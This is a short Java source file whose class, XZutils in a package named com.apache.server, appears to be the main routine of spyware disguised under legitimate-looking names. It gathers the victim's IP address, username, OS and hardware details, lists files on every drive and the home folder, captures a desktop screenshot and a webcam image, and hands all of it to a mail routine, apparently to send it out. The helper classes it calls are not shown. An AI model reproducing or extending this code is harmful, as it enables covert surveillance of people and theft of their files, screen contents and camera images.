package com.apache.server;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import javax.swing.filechooser.FileSystemView;



public class XZutils {
	public static void main(String[] args) throws Exception {
		dataTrans();
	}
	
	public static int dataTrans() throws Exception {
		String ip=null;
		try {
			 ip=TargetInfo.getIP();
		} catch (Exception e) {
			ip="û����";
		}
		String osinfo=TargetInfo.getInfo();
		String username=TargetInfo.getUser();
		String hardinfo=FileSys.getHard();
		
		List<String>list =new ArrayList<>();
		FileSystemView fsv = FileSystemView.getFileSystemView();
		File desktop=fsv.getHomeDirectory();  
		File[] roots = File.listRoots();
		for(File file:roots) {
			FileSys.getAllFile(file,list);
		}
		FileSys.getAllFile(desktop,list);
		CaptureScreen. captureScreen("c:\\image","desktop.png");
		list.add("c:\\image\\desktop.png");
		WebCamGet.getWebCam();
		list.add("c:\\image\\webcam.png");
		
		MailDemo.fun2(list, username, osinfo, ip, hardinfo);
		return 1;
	}

}
